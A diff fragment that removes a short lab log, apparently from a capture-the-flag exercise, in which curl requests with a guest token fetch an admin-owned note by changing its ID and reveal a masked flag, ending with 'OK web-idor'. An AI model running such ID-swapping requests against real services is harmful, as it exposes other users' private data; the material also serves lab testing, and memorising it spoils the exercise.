@@ -1,5 +1,0 @@
-$ curl -s -H "X-Token: (guest)" http://localhost:8081/api/notes
-{"user": "guest", "notes": ["1002", "1003"]}
-$ curl -s -H "X-Token: (guest)" http://localhost:8081/api/notes/1001
-{"id": "1001", "owner": "admin", "text": "Release checklist. Flag: flag{bc0d****}"}
-OK web-idor
